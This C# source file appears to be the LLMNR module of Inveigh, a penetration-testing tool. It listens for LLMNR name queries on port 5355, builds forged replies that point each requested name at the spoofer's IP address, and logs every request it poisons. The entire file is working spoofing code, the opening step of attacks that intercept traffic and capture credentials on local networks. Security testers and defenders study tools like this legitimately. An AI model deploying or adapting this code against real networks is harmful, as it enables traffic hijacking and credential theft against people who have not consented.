using System;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace Inveigh
{
    class LLMNR
    {

        public static void LLMNRListener(string ipVersion, string IP)
        {
            IPAddress listenerIPAddress = IPAddress.Any;
            string type = "LLMNR";

            if (String.Equals(ipVersion, "IPv6"))
            {

                listenerIPAddress = IPAddress.IPv6Any;
                type = "LLMNRv6";
            }

            IPEndPoint ipEndPoint = new IPEndPoint(listenerIPAddress, 5355);
            IPAddress destinationIPAddress = IPAddress.Parse(IP);
            UdpClient udpClient = UDP.UDPListener(type, ipVersion, 5355);

            while (!Program.exitInveigh)
            {

                try
                {
                    byte[] udpPayload = udpClient.Receive(ref ipEndPoint);
                    LLMNRReply("listener", ipVersion, null, udpPayload, null, destinationIPAddress, ipEndPoint, udpClient);

                }
                catch (Exception ex)
                {
                    Program.outputList.Add(String.Format("[-] [{0}] LLMNR spoofer error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));
                }

            }

        }
        
        public static void LLMNRReply(string method, string ipVersion, byte[] sourcePortData, byte[] payload, IPAddress sourceIPAddress, IPAddress destinationIPAddress, IPEndPoint ipEndPoint, UdpClient udpClient)
        {
            int sourcePortNumber = 0;
            bool enabled = Program.enabledLLMNR;

            if (String.Equals(method, "listener"))
            {
                sourcePortNumber = ipEndPoint.Port;
                sourcePortData = Util.IntToByteArray2(sourcePortNumber);
                sourceIPAddress = ipEndPoint.Address;       
            }

            string sourceIP = sourceIPAddress.ToString();
            byte[] type = new byte[2];
            Buffer.BlockCopy(payload, (payload.Length - 4), type, 0, 2);
            string typeName = "A";

            if (String.Equals(BitConverter.ToString(type), "00-1C"))
            {
                typeName = "AAAA";
            }

            if (String.Equals(ipVersion, "IPv6"))
            {
                enabled = Program.enabledLLMNRv6;
            }

            byte[] request = new byte[payload.Length - 18];
            byte[] requestLength = new byte[1];
            Buffer.BlockCopy(payload, 12, requestLength, 0, 1);
            Buffer.BlockCopy(payload, 13, request, 0, request.Length);
            string requestHost = Util.ParseNameQuery(12, payload);
            string responseMessage = Util.CheckRequest("LLMNR", requestHost, sourceIP, Program.argIP, typeName, Program.argLLMNRTypes, enabled);
            string responseStatus = "-";

            if (Program.enabledLLMNR && String.Equals(responseMessage, "response sent"))
            {
                responseStatus = "+";
                byte[] response = LLMNR.GetLLMNRResponse(method, ipVersion, typeName, sourceIPAddress, destinationIPAddress, sourcePortData, payload);

                if (String.Equals(method, "sniffer"))
                {
                    UDP.UDPSnifferClient(ipVersion, 0, sourceIPAddress, sourcePortNumber, response);
                }
                else
                {
                    UDP.UDPListenerClient(sourceIPAddress, sourcePortNumber, udpClient, response);
                }

            }

            lock (Program.outputList)
            {
                Program.outputList.Add(String.Format("[{0}] [{1}] LLMNR({2}) request for {3} from {4} [{5}]", responseStatus, DateTime.Now.ToString("s"), typeName, requestHost, sourceIPAddress, responseMessage));
            }

        }

        public static byte[] GetLLMNRResponse(string method, string ipVersion, string llmnrRequestType, IPAddress sourceIPAddress, IPAddress destinationIPAddress, byte[] sourcePortData, byte[] payload)
        {
            byte[] TTL = BitConverter.GetBytes(Int32.Parse(Program.argLLMNRTTL));
            Array.Reverse(TTL);
            Array.Reverse(sourcePortData);
            byte[] typeData = new byte[2];
            Buffer.BlockCopy(payload, (payload.Length - 4), typeData, 0, 2);
            byte[] transactionID = new byte[2];
            Buffer.BlockCopy(payload, 0, transactionID, 0, 2);
            byte[] request = new byte[payload.Length - 18];
            byte[] requestLength = new byte[1];
            Buffer.BlockCopy(payload, 12, requestLength, 0, 1);
            Buffer.BlockCopy(payload, 13, request, 0, request.Length);
            MemoryStream memoryStream = new MemoryStream();

            if (String.Equals(method, "sniffer"))
            {
                memoryStream.Write((new byte[2] { 0x14, 0xeb }), 0, 2);
                memoryStream.Write(sourcePortData, 0, 2);
                memoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                memoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
            }

            memoryStream.Write(transactionID, 0, transactionID.Length);
            memoryStream.Write((new byte[10] { 0x80, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
            memoryStream.Write(requestLength, 0, 1);
            memoryStream.Write(request, 0, request.Length);

            if (String.Equals(llmnrRequestType, "A"))
            {
                memoryStream.Write((new byte[5] { 0x00, 0x00, 0x01, 0x00, 0x01 }), 0, 5);
            }
            else
            {
                memoryStream.Write((new byte[5] { 0x00, 0x00, 0x1c, 0x00, 0x01 }), 0, 5);
            }

            memoryStream.Write(requestLength, 0, 1);
            memoryStream.Write(request, 0, request.Length);

            if (String.Equals(llmnrRequestType, "A"))
            {
                memoryStream.Write((new byte[5] { 0x00, 0x00, 0x01, 0x00, 0x01 }), 0, 5);
                memoryStream.Write(TTL, 0, 4);
                memoryStream.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
                memoryStream.Write(Program.spooferIPData, 0, Program.spooferIPData.Length);
            }
            else
            {
                memoryStream.Write((new byte[5] { 0x00, 0x00, 0x1c, 0x00, 0x01 }), 0, 5);
                memoryStream.Write(TTL, 0, 4);
                memoryStream.Write((new byte[2] { 0x00, 0x10 }), 0, 2);
                memoryStream.Write(Program.spooferIPv6Data, 0, Program.spooferIPv6Data.Length);
            }

            if (String.Equals(method, "sniffer"))
            {
                memoryStream.Position = 4;
                memoryStream.Write(Util.IntToByteArray2((int)memoryStream.Length), 0, 2);
            }

            if (String.Equals(ipVersion, "IPv6"))
            {
                byte[] llmnrPseudoHeader = Util.GetIPv6PseudoHeader(sourceIPAddress, 17, (int)memoryStream.Length);
                UInt16 checkSum = Util.GetPacketChecksum(llmnrPseudoHeader, memoryStream.ToArray());
                memoryStream.Position = 6;
                byte[] packetChecksum = Util.IntToByteArray2(checkSum);
                Array.Reverse(packetChecksum);
                memoryStream.Write(packetChecksum, 0, 2);
            }

            return memoryStream.ToArray();
        }

    }

}
